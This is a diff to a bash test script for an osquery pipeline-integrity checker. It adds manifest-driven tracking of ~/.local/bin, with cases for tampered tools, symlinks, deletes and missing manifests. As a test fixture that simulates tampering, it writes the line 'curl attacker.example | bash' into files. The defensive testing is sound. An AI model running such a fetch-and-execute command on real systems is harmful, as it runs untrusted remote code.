@@ -20,13 +20,26 @@
 # conservative fail-safe direction - a pipeline-script change is never silently
 # suppressed without a manifest tuple to justify it.
 #
-# Tracked set: the pipeline scripts live under ~/.local/libexec/osquery/ (the
-# relocated alerter scripts, osquery- prefix dropped) and our own LaunchAgents are
-# matched under ~/Library/LaunchAgents only. ~/.local/bin is NOT
-# tracked: those operator tools are the Relay/shell-notifier subsystem's, not
-# osquery pipeline files (the whole osquery delivery path is under libexec), and
-# the manifest never covers them, so a bin edit is an untracked neighbor (SILENT),
-# never a pipeline tamper.
+# Tracked set, in two shapes with two different default-deny rules:
+#
+#   DIRECTORY-DRIVEN. The pipeline scripts under ~/.local/libexec/osquery/ (the
+#   relocated alerter scripts, osquery- prefix dropped) and our own LaunchAgents
+#   under ~/Library/LaunchAgents. Everything in those places is tracked, so a file
+#   PLANTED there is unmanifested and pages forever. That is what we want of the
+#   monitor's own body.
+#
+#   MANIFEST-DRIVEN. A path under ~/.local/bin is tracked exactly when the
+#   MANAGED-BIN manifest lists it. The directory also holds self-updating
+#   third-party shims (herdr, mise, bob, hermes, and symlinks into pipx and uv tool
+#   dirs) that chezmoi does not manage and cannot vouch for, so directory-driven
+#   tracking would page on every one of their self-updates. Deriving the tracked
+#   set from the manifest makes tracked and manifested identical by construction
+#   rather than by convention.
+#
+#   ...with the fail-safe hinge: when the managed-bin manifest is missing,
+#   unreadable, empty or untrustworthy, EVERY bin path is tracked instead. A
+#   monitor whose known-good list broke must get louder, not quieter, so the
+#   degraded direction is "page on bin events", never "ignore ~/.local/bin".
 set -euo pipefail
 
 REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
@@ -59,7 +72,17 @@ uid_self="$(id -u)"
 foreign_uid=$((uid_self + 1))
 
 libexec_script="$home/.local/libexec/osquery/results-alerter.sh"
-bin_script="$home/.local/bin/relay.sh"
+# A MANAGED bin tool (in the managed-bin manifest) and an UNMANAGED third-party
+# shim beside it (in no manifest, because chezmoi does not manage it). The shim is
+# the churn case the whole manifest-driven tracking rule exists for: it rewrites
+# itself on its own schedule and must never page.
+bin_script="$home/.local/bin/update-skills.sh"
+bin_shim="$home/.local/bin/mise"
+# A managed bin tool whose bytes are replaced AFTER the bin manifest is written.
+bin_tampered="$home/.local/bin/homebrew-weekly-upgrade.sh"
+# A symlink standing where a manifested bin tool should be.
+bin_symlink="$home/.local/bin/claude-audit.sh"
+bin_symlink_data="$work/outside-bin-payload.sh"
 # A second tracked file whose content is IDENTICAL to libexec_script: its hash is a
 # real manifest hash, but bound to another path (the swap-in-place probe).
 twin_script="$home/.local/libexec/osquery/twin.sh"
@@ -81,6 +104,10 @@ garbage_script="$home/.local/libexec/osquery/garbage-line.sh"
 
 printf 'echo libexec\n' >"$libexec_script"
 printf 'echo bin\n' >"$bin_script"
+printf 'unmanaged self-updating binary\n' >"$bin_shim"
+printf 'echo brew-upgrade\n' >"$bin_tampered"
+printf 'echo audit\n' >"$bin_symlink_data"
+ln -s "$bin_symlink_data" "$bin_symlink"
 printf 'echo libexec\n' >"$twin_script" # same bytes as libexec_script
 printf 'echo original\n' >"$stale_script"
 printf 'echo linked\n' >"$symlink_data"
@@ -97,10 +124,13 @@ printf 'echo garbage line\n' >"$garbage_script"
 # vacuous.
 chmod 755 "$libexec_script" "$twin_script" "$stale_script" \
   "$chmod_script" "$setuid_script" "$chown_script" "$legacy_script" "$garbage_script"
-chmod 755 "$bin_script"
+chmod 755 "$bin_script" "$bin_tampered"
 
 hash_libexec="$(sha_of "$libexec_script")"
 hash_bin="$(sha_of "$bin_script")"
+hash_bin_shim="$(sha_of "$bin_shim")"
+hash_bin_tampered_original="$(sha_of "$bin_tampered")"
+hash_bin_linked="$(sha_of "$bin_symlink_data")"
 hash_stale_original="$(sha_of "$stale_script")"
 hash_linked="$(sha_of "$symlink_data")"
 hash_chmod="$(sha_of "$chmod_script")"
@@ -119,7 +149,6 @@ hash_wrong="0000000000000000000000000000000000000000000000000000000000000000"
 manifest="$work/pipeline-known-good.sha256"
 {
   printf '%s 0755 %s %s\n' "$hash_libexec" "$uid_self" "$libexec_script"
-  printf '%s 0755 %s %s\n' "$hash_bin" "$uid_self" "$bin_script"
   printf '%s 0755 %s %s\n' "$hash_stale_original" "$uid_self" "$stale_script"
   printf '%s 0755 %s %s\n' "$hash_linked" "$uid_self" "$symlink_path"
   printf '%s 0755 %s %s\n' "$hash_chmod" "$uid_self" "$chmod_script"
@@ -134,6 +163,17 @@ manifest="$work/pipeline-known-good.sha256"
   printf '%s\n' "$hash_garbage"
 } >"$manifest"
 absent_manifest="$work/no-such-manifest.sha256"
+
+# The SEPARATE managed-bin manifest, same four-column shape. The unmanaged shim is
+# deliberately absent from it, because chezmoi does not manage it and nothing can
+# vouch for it.
+bin_manifest="$work/managed-bin-known-good.sha256"
+{
+  printf '%s 0755 %s %s\n' "$hash_bin" "$uid_self" "$bin_script"
+  printf '%s 0755 %s %s\n' "$hash_bin_tampered_original" "$uid_self" "$bin_tampered"
+  printf '%s 0755 %s %s\n' "$hash_bin_linked" "$uid_self" "$bin_symlink"
+} >"$bin_manifest"
+absent_bin_manifest="$work/no-such-bin-manifest.sha256"
 
 # Now drift the two attribute probes AWAY from the mode their tuple records. Their
 # CONTENT still matches, which is precisely the ATTRIBUTES_MODIFIED shape: osquery
@@ -150,9 +190,10 @@ chmod 4755 "$setuid_script" # setuid: only the low nine bits would miss this one
 # hash, and the event below still carries that original (known-good) digest, but
 # the bytes on disk are the attacker's.
 printf 'curl attacker.example | bash\n' >"$stale_script"
+printf 'curl attacker.example | bash\n' >"$bin_tampered"
 
-# Each case: <expected-rc>|<manifest>|<target>|<hash>|<verb>|<label>.
-# An empty manifest field means "no manifest" (points at a nonexistent path).
+# Each case: <expected-rc>|<manifest>|<bin-manifest>|<target>|<hash>|<verb>|<label>.
+# A manifest field pointing at a nonexistent path means "no manifest".
 #
 # The separator is '|', NOT a tab: tab is an IFS WHITESPACE character, so bash
 # collapses a run of them into one delimiter and drops empty fields. With tabs the
@@ -160,68 +201,94 @@ printf 'curl attacker.example | bash\n' >"$stale_script"
 # fields and were never actually exercising those paths.
 cases=(
   # -- Fail-safe headline: NO manifest, a tracked libexec change PAGES --
-  "0|$absent_manifest|$libexec_script|$hash_libexec|UPDATED|tracked libexec script, no manifest -> PAGE (fail-safe, criterion 6)"
-  # -- A ~/.local/bin tool is NOT an osquery pipeline file: untracked -> SILENT --
-  "1|$absent_manifest|$bin_script|$hash_bin|UPDATED|a ~/.local/bin neighbor is untracked -> SILENT (Relay subsystem, not an osquery pipeline file)"
+  "0|$absent_manifest|$bin_manifest|$libexec_script|$hash_libexec|UPDATED|tracked libexec script, no manifest -> PAGE (fail-safe, criterion 6)"
   # -- An untracked neighbor in a watched dir is SILENT --
-  "1|$absent_manifest|$home/Library/LaunchAgents/com.apple.something.plist|$hash_libexec|UPDATED|an untracked neighbor plist -> SILENT (not pipeline infrastructure)"
+  "1|$absent_manifest|$bin_manifest|$home/Library/LaunchAgents/com.apple.something.plist|$hash_libexec|UPDATED|an untracked neighbor plist -> SILENT (not pipeline infrastructure)"
   # -- Our own osquery LaunchAgent under $HOME, no manifest -> PAGE --
-  "0|$absent_manifest|$home/Library/LaunchAgents/com.webdavis.osquery-uptime-watchdog.plist|$hash_libexec|UPDATED|our own osquery LaunchAgent under $HOME, no manifest -> PAGE"
+  "0|$absent_manifest|$bin_manifest|$home/Library/LaunchAgents/com.webdavis.osquery-uptime-watchdog.plist|$hash_libexec|UPDATED|our own osquery LaunchAgent under $HOME, no manifest -> PAGE"
   # -- A same-named plist OUTSIDE $HOME is NOT ours: the manifest only ever covers
   #    the user agents chezmoi manages, so tracking a /Library twin by basename
   #    would be a watched-but-unmanifested file that pages forever. It falls through
   #    to the persistence detector, which default-denies it. --
-  "1|$absent_manifest|/Library/LaunchAgents/com.webdavis.osquery-uptime-watchdog.plist|$hash_libexec|UPDATED|a com.webdavis.osquery-*.plist under /Library is NOT tracked -> SILENT (tracked set == manifest set)"
+  "1|$absent_manifest|$bin_manifest|/Library/LaunchAgents/com.webdavis.osquery-uptime-watchdog.plist|$hash_libexec|UPDATED|a com.webdavis.osquery-*.plist under /Library is NOT tracked -> SILENT (tracked set == manifest set)"
   # -- A DELETE of a tracked file always PAGES, even with a manifest present --
-  "0|$manifest|$libexec_script||DELETED|a delete of a tracked file -> PAGE (destructive, manifest cannot vouch)"
+  "0|$manifest|$bin_manifest|$libexec_script||DELETED|a delete of a tracked file -> PAGE (destructive, manifest cannot vouch)"
   # -- Empty event hash (atomic-rename shape): debounce, rehash disk; no manifest -> PAGE --
-  "0|$absent_manifest|$libexec_script||MOVED_TO|atomic-rename empty-hash event, no manifest -> PAGE after rehash"
+  "0|$absent_manifest|$bin_manifest|$libexec_script||MOVED_TO|atomic-rename empty-hash event, no manifest -> PAGE after rehash"
   # -- Manifest present: the file's CURRENT content is known-good -> SILENT --
-  "1|$manifest|$libexec_script|$hash_libexec|UPDATED|an unchanged tracked file whose current content is in the manifest -> SILENT"
+  "1|$manifest|$bin_manifest|$libexec_script|$hash_libexec|UPDATED|an unchanged tracked file whose current content is in the manifest -> SILENT"
   # -- THE STALE-DIGEST ATTACK: the event carries the KNOWN-GOOD digest recorded at
   #    event time, but the bytes on disk have since been replaced. The verdict must
   #    trust the MANIFEST against the CURRENT content, never the event digest, or an
   #    attacker can swap the file in after a good event is recorded, run, and
   #    restore before the next collection. --
-  "0|$manifest|$stale_script|$hash_stale_original|UPDATED|a known-good EVENT digest whose on-disk content has since changed -> PAGE (rehash at judgment)"
+  "0|$manifest|$bin_manifest|$stale_script|$hash_stale_original|UPDATED|a known-good EVENT digest whose on-disk content has since changed -> PAGE (rehash at judgment)"
   # -- A SYMLINK standing where a manifested regular file belongs -> PAGE, even
   #    though following it would hash to the manifested content. --
-  "0|$manifest|$symlink_path|$hash_linked|UPDATED|a symlink at a manifested path -> PAGE (links are never followed)"
+  "0|$manifest|$bin_manifest|$symlink_path|$hash_linked|UPDATED|a symlink at a manifested path -> PAGE (links are never followed)"
   # -- The event digest is NOT the trust input: a wrong/absent event hash on a file
   #    whose CURRENT content is known-good still resolves SILENT. --
-  "1|$manifest|$libexec_script|$hash_wrong|UPDATED|an untrustworthy event digest does not decide the verdict when the content is known-good -> SILENT"
+  "1|$manifest|$bin_manifest|$libexec_script|$hash_wrong|UPDATED|an untrustworthy event digest does not decide the verdict when the content is known-good -> SILENT"
   # -- Manifest present: a real manifest hash bound to ANOTHER path -> PAGE. The
   #    twin has the same bytes as libexec_script, so a hash-only check would bless
   #    it; the (path, hash) binding is what refuses it. --
-  "0|$manifest|$twin_script|$hash_libexec|UPDATED|swap-in-place (real content whose tuple is bound to another path) -> PAGE (tuple binding)"
+  "0|$manifest|$bin_manifest|$twin_script|$hash_libexec|UPDATED|swap-in-place (real content whose tuple is bound to another path) -> PAGE (tuple binding)"
   # -- ATTRIBUTES: a chmod on a manifested file PAGES. The content is byte-for-byte
   #    what the manifest records and the event carries that unchanged digest, so a
   #    content-only manifest returns SILENT here. Making a pipeline script
   #    group-writable is a plausible setup step for a later tamper from a less
   #    privileged context, so it has to page on its own. --
-  "0|$manifest|$chmod_script|$hash_chmod|ATTRIBUTES_MODIFIED|a chmod g+w on a manifested file -> PAGE (mode is bound, not just content)"
+  "0|$manifest|$bin_manifest|$chmod_script|$hash_chmod|ATTRIBUTES_MODIFIED|a chmod g+w on a manifested file -> PAGE (mode is bound, not just content)"
   # -- ATTRIBUTES: the setuid bit is inside the bound mode. It lives above the low
   #    nine permission bits, so a mode reader that keeps only those (BSD stat %Lp)
   #    reads 4755 back as 0755 and blesses it. --
-  "0|$manifest|$setuid_script|$hash_setuid|ATTRIBUTES_MODIFIED|a setuid bit set on a manifested file -> PAGE (all twelve mode bits are bound)"
+  "0|$manifest|$bin_manifest|$setuid_script|$hash_setuid|ATTRIBUTES_MODIFIED|a setuid bit set on a manifested file -> PAGE (all twelve mode bits are bound)"
   # -- OWNERSHIP: a file whose owner is not the one its tuple records PAGES, with
   #    content and mode both matching. --
-  "0|$manifest|$chown_script|$hash_chown|ATTRIBUTES_MODIFIED|a manifested file owned by someone other than its tuple records -> PAGE (owner is bound)"
+  "0|$manifest|$bin_manifest|$chown_script|$hash_chown|ATTRIBUTES_MODIFIED|a manifested file owned by someone other than its tuple records -> PAGE (owner is bound)"
   # -- MALFORMED MANIFEST LINES resolve to PAGE, never to silence. Both probes have
   #    correct content, mode and owner on disk; only the line that would vouch for
   #    them is short. A pre-mode/owner manifest is exactly the two-column case. --
-  "0|$manifest|$legacy_script|$hash_legacy|UPDATED|a two-column (pre mode/owner) manifest line -> PAGE (a short line never vouches)"
-  "0|$manifest|$garbage_script|$hash_garbage|UPDATED|a one-field manifest line -> PAGE (an unparseable line never vouches)"
+  "0|$manifest|$bin_manifest|$legacy_script|$hash_legacy|UPDATED|a two-column (pre mode/owner) manifest line -> PAGE (a short line never vouches)"
+  "0|$manifest|$bin_manifest|$garbage_script|$hash_garbage|UPDATED|a one-field manifest line -> PAGE (an unparseable line never vouches)"
+
+  # === the managed ~/.local/bin arm ==========================================
+  # -- A managed bin tool whose current state matches its own manifest -> SILENT.
+  #    Every legitimate apply of update-skills.sh lands here; if this paged, the
+  #    coverage would be unusable. --
+  "1|$manifest|$bin_manifest|$bin_script|$hash_bin|UPDATED|an unchanged managed bin tool whose tuple is in the managed-bin manifest -> SILENT"
+  # -- THE HEADLINE: a managed bin tool tampered on disk PAGES. update-skills.sh and
+  #    homebrew-weekly-upgrade.sh run unattended from LaunchAgents, so this is the
+  #    behavior the whole change exists for. --
+  "0|$manifest|$bin_manifest|$bin_tampered|$hash_bin_tampered_original|UPDATED|a TAMPERED managed bin tool -> PAGE (its manifested tuple no longer matches the bytes on disk)"
+  # -- THE CHURN PIN: an UNMANAGED third-party shim in the same directory is not in
+  #    the manifest, so it is not tracked and stays SILENT. mise, herdr, bob and
+  #    yt-dlp rewrite themselves on their own schedule; paging on that would make
+  #    the whole watch noise the operator learns to ignore. --
+  "1|$manifest|$bin_manifest|$bin_shim|$hash_bin_shim|UPDATED|an UNMANAGED self-updating shim in ~/.local/bin -> SILENT (not manifested, so not tracked)"
+  # -- A DELETE of a manifested bin tool PAGES: the manifest still lists it, so it
+  #    is tracked, and there are no bytes left to vouch for. --
+  "0|$manifest|$bin_manifest|$bin_script||DELETED|a delete of a manifested bin tool -> PAGE"
+  # -- A SYMLINK standing where a manifested bin tool belongs -> PAGE, even though
+  #    following it would hash to the manifested content. --
+  "0|$manifest|$bin_manifest|$bin_symlink|$hash_bin_linked|UPDATED|a symlink at a manifested bin path -> PAGE (links are never followed)"
+  # -- THE FAIL-SAFE HINGE: with the managed-bin manifest MISSING, a bin change
+  #    cannot be confirmed legitimate, so it PAGES rather than going quiet. --
+  "0|$manifest|$absent_bin_manifest|$bin_script|$hash_bin|UPDATED|a managed bin tool with NO managed-bin manifest -> PAGE (fail-safe)"
+  # -- ...and the degraded direction is louder, not quieter: with no manifest even
+  #    the unmanaged shim is tracked and pages. A broken known-good list must not
+  #    silently un-watch the directory it was there to watch. --
+  "0|$manifest|$absent_bin_manifest|$bin_shim|$hash_bin_shim|UPDATED|an unmanaged shim with NO managed-bin manifest -> PAGE (a broken manifest gets LOUDER, never quieter)"
 )
 
 expected=()
 labels=()
 feed=""
 for row in "${cases[@]}"; do
-  IFS='|' read -r rc manifest_path target hash verb label_text <<<"$row"
+  IFS='|' read -r rc manifest_path bin_manifest_path target hash verb label_text <<<"$row"
   expected+=("$rc")
   labels+=("$label_text")
-  feed+="$manifest_path|$target|$hash|$verb"$'\n'
+  feed+="$manifest_path|$bin_manifest_path|$target|$hash|$verb"$'\n'
 done
 
 # One sourcing subshell drives every case. OSQUERY_PIPELINE_REHASH_DELAY=0 keeps
@@ -233,8 +300,9 @@ got=()
 mapfile -t got < <(
   printf '%s' "$feed" | HOME="$home" OSQUERY_PIPELINE_REHASH_DELAY=0 OSQUERY_PIPELINE_SETTLE_SECONDS=0 bash -c '
     source "$1"
-    while IFS="|" read -r manifest target hash verb; do
+    while IFS="|" read -r manifest bin_manifest target hash verb; do
       OSQUERY_PIPELINE_MANIFEST="$manifest"
+      OSQUERY_MANAGED_BIN_MANIFEST="$bin_manifest"
       rc=0
       pipeline_verdict "$target" "$hash" "$verb" || rc=$?
       printf "%s\n" "$rc"
@@ -260,10 +328,10 @@ done
 trust_rc=0
 HOME="$home" bash -c '
   source "$1"
-  unset OSQUERY_PIPELINE_MANIFEST
+  unset OSQUERY_PIPELINE_MANIFEST OSQUERY_MANAGED_BIN_MANIFEST
   _pipeline_manifest_is_trustworthy "$2"
 ' _ "$HELPER" "$manifest" || trust_rc=$?
 [[ $trust_rc -ne 0 ]] ||
   fail "a manifest that is not root-owned must not be trusted to suppress a page"
 
-printf 'osquery-pipeline-verdict: OK (fail-safe PAGE for a tracked libexec file without a manifest; a ~/.local/bin neighbor and a /Library plist twin are SILENT; delete PAGES; manifest tuple match SILENT, mismatch/swap-in-place PAGE; chmod, setuid and a foreign owner PAGE on unchanged content; short and unparseable manifest lines PAGE; a non-root-owned manifest is refused)\n'
+printf 'osquery-pipeline-verdict: OK (fail-safe PAGE for a tracked libexec file without a manifest; a /Library plist twin is SILENT; delete PAGES; manifest tuple match SILENT, mismatch/swap-in-place PAGE; chmod, setuid and a foreign owner PAGE on unchanged content; short and unparseable manifest lines PAGE; a TAMPERED managed bin tool PAGES while an unmanaged shim beside it is SILENT, and a missing managed-bin manifest pages BOTH; a non-root-owned manifest is refused)\n'
